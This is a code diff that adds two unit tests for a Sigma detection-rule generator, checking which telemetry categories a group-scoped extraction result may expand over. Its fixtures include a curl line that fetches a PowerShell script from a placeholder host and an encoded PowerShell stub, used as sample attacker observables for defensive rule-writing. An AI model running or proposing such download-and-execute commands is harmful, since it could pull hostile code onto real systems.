@@ -2414,6 +2414,42 @@ class TestSigmaExpansionCoverage:
         assert needs_expansion is True
         assert uncovered == ["powershell"]
 
+    def test_needs_expansion_scopes_to_group_observables_when_input_is_group_scoped(self):
+        """Execution 36: a service_creation group carried the article-wide cmdline subresult, so
+        process_creation looked uncovered and the curl rule the sibling group already wrote was
+        regenerated. A group-scoped input may only expand over its own observable types."""
+        service = self._service()
+        service_rule = Mock(rule_yaml=self._rule("service_creation"))
+        extraction_result = {
+            "observables": [{"type": "windows_services", "value": "MicrosoftEdgeUpdateSvc"}],
+            "sigma_generation_group": {"telemetry_category": "service_creation", "observable_indices": [1]},
+            "subresults": {
+                "cmdline": {"count": 1, "items": [{"value": "curl -sk -o x.ps1 http://example.test/x.ps1"}]},
+                "windows_services": {"count": 1, "items": [{"value": "MicrosoftEdgeUpdateSvc"}]},
+            },
+        }
+
+        needs_expansion, uncovered = service._needs_expansion([service_rule], extraction_result)
+
+        assert needs_expansion is False
+        assert uncovered == []
+
+    def test_needs_expansion_still_expands_own_uncovered_category_in_group_scoped_input(self):
+        service = self._service()
+        extraction_result = {
+            "observables": [{"type": "cmdline", "value": "powershell -enc AAA"}],
+            "sigma_generation_group": {"telemetry_category": "process_creation", "observable_indices": [0]},
+            "subresults": {
+                "cmdline": {"count": 1, "items": ["powershell -enc AAA"]},
+                "registry_keys": {"count": 1, "items": ["HKLM\\Run"]},
+            },
+        }
+
+        needs_expansion, uncovered = service._needs_expansion([], extraction_result)
+
+        assert needs_expansion is True
+        assert uncovered == ["process_creation"]
+
     @pytest.mark.asyncio
     async def test_build_expansion_prompt_includes_context_for_first_five_items_only(self):
         service = self._service()
